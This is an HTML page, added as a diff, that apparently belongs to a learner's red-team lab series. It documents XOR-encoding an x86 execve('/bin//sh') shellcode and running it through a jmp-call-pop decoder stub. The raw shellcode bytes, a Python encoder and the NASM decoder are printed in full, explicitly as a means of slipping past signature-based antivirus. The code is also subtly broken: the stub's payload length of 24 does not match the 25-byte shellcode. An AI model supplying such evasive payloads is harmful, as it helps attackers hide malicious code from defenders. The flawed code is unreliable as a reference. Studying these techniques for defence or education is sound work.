@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 3 – XOR Shellcode Encoding + Decoder Stub (x86)</title>
+  <link rel="stylesheet" href="assets/css/style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+</head>
+<body>
+  <div class="container">
+    <h1>🧪 Red Team Lab Report: XOR-Encoding & Runtime Decoder Stub for x86 Shellcode</h1>
+    <blockquote>
+      <strong>Note from the Author:</strong><br>
+      I’m learning x86 assembly and shellcode development from scratch as part of a focused journey into offensive security. These lab reports are intentionally detailed and exploratory — not to project mastery, but to document what I’ve studied, broken down, and internalized as a self-learner preparing for real-world Red Team work. If you’re a professional reading this, I welcome any corrections, feedback, or discussion.
+    </blockquote>
+
+    <p><strong>Author:</strong> Alexander Nichols<br>
+      <strong>Date:</strong> July 7th, 2025<br>
+      <strong>Platform:</strong> Kali Linux<br>
+      <strong>Category:</strong> Shellcode Obfuscation / Red Team Payloads / Assembly<br>
+      <strong>Objective:</strong> To XOR-encode simple shellcode and write a position-independent decoder stub in x86 assembly that decrypts and executes the shellcode in memory.</p>
+    <hr>
+
+    <h2>📚 Background: Why XOR?</h2>
+    <p>XOR encoding is simple but powerful. It allows you to obfuscate payloads by transforming each byte with a known key. When reversed at runtime using the same key, it reveals the original logic. This makes it valuable for avoiding detection by signature-based defenses.</p>
+<pre><code class="language-none">encoded = original ^ key
+original = encoded ^ key</code></pre>
+    <p>🧠 How could such a basic trick evade AV? Seeing how static tools match against known shellcode patterns makes it a little clearer: sometimes, simplicity wins!</p>
+    <hr>
+
+    <h2>🛠️ Lab Environment</h2>
+    <table>
+      <tr><td>OS</td><td>Kali Linux 2024.2</td></tr>
+      <tr><td>Architecture</td><td>x86 (32-bit)</td></tr>
+      <tr><td>Tools Used</td><td>nasm, ld, gdb, python3, xxd</td></tr>
+      <tr><td>Shellcode</td><td><code>execve("/bin//sh")</code> (from Lab 2)</td></tr>
+    </table>
+    <hr>
+
+    <h2>📂 Step 1: Original Shellcode (Pre-Obfuscation)</h2>
+<pre><code class="language-nasm">_start:
+  xor eax, eax
+  push eax
+  push 0x68732f2f
+  push 0x6e69622f
+  mov ebx, esp
+  push eax
+  push ebx
+  mov ecx, esp
+  mov edx, eax
+  mov al, 0x0b
+  int 0x80</code></pre>
+    <p>This invokes <code>execve("/bin//sh", NULL, NULL)</code>. I used this exact payload in Lab 2 and validated it in GDB before encoding. Understanding the syscall convention was key here: ebx points to the string, ecx to argv[], and edx to envp.</p>
+    <hr>
+
+    <h2>🐍 Step 2: Encode the Shellcode with Python</h2>
+<pre><code class="language-python">key = 0xAA
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
+encoded = bytes([b ^ key for b in shellcode])
+print(','.join(f'0x{b:02x}' for b in encoded))</code></pre>
+<p>This script takes each byte and XORs it with 0xAA. The result can be placed directly in a NASM <code>db</code> statement.</p>
+<p>🧪 This was my first custom encoder — and a great reminder that even simple Python scripting can turn into offensive tooling foundations.</p>
+    <hr>
+
+    <h2>🧠 Step 3: Decoder Stub in NASM</h2>
+<pre><code class="language-nasm">BITS 32
+global _start
+
+section .text
+_start:
+  jmp short call_decoder
+
+decoder:
+  pop esi
+  xor ecx, ecx
+  mov cl, payload_len
+  mov bl, xor_key
+.decode:
+  xor byte [esi], bl
+  inc esi
+  loop .decode
+  jmp esi
+
+call_decoder:
+  call decoder
+
+payload:
+  db 0x9b, 0x6a, 0xfa, ...  ; encoded bytes go here
+
+payload_len equ 24
+xor_key     equ 0xAA</code></pre>
+    <p>📌 <strong>Why jmp-call-pop?</strong> This trick helps the shellcode find its own location in memory without needing fixed addresses, which makes it position-independent and injection-safe.</p>
+    <p>🧠 Each instruction here was something I had to look up, test, and step through in GDB to understand. Writing the loop and getting the length right was more challenging than expected — a great reminder of how low-level programming requires precision.</p>
+    <hr>
+
+    <h2>🔬 Step 4: Verifying in GDB</h2>
+<pre><code class="language-bash">gdb ./decoder
+(gdb) break _start
+(gdb) run
+(gdb) si
+(gdb) x/24xb $esi  # before decoding
+(gdb) si           # step into loop
+(gdb) x/24xb $esi  # after decoding</code></pre>
+    <p>This was the moment where everything made sense. I could literally watch the garbage bytes morph back into recognizable shellcode. That gave me confidence that I understood what my decoder was actually doing in memory.</p>
+    <hr>
+
+    <h2>🛡️ Obfuscation Value & Limitations</h2>
+    <ul>
+      <li>✅ Bypasses static pattern matching</li>
+      <li>✅ Helps avoid badchars in payload delivery</li>
+      <li>❌ Decoder stub itself can be a signature</li>
+      <li>⚠️ Doesn't evade dynamic tracing (e.g. EDRs)</li>
+    </ul>
+    <p>💡 I learned that real-world evasive payloads often mutate the stub or layer multiple encoders — this lab showed me how and why that works at a basic level.</p>
+    <hr>
+
+    <h2>✅ Skills Practiced</h2>
+    <ul>
+      <li>Understanding syscall convention and register prep</li>
+      <li>Assembly-level loop construction</li>
+      <li>Position-independent shellcode structure</li>
+      <li>Runtime memory inspection in GDB</li>
+      <li>Simple but practical Python encoding</li>
+    </ul>
+
+    <blockquote>
+      <strong>Reflection:</strong> I don’t yet feel like an expert at this — but after building and debugging a working decoder stub, I feel like I understand what malware authors and red teamers are doing under the hood. That’s a win.
+    </blockquote>
+    <hr>
+
+    <h2>🚀 What's Next?</h2>
+    <ul>
+      <li>Random key + runtime key embedding</li>
+      <li>Rolling XOR decoder (non-static stub)</li>
+      <li>Injecting into BOF or C wrapper</li>
+      <li>Encoding with non-XOR methods (add/sub, ROL, etc.)</li>
+    </ul>
+
+    <p><em>All work was performed in a local Kali VM with no network access. For educational use only.</em></p>
+    <p><a href="labs.html">⬅ Back to Labs</a></p>
+  </div>
+
+  <button id="mode-toggle">🌙</button>
+  <script src="assets/js/darkmode.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</body>
+</html>
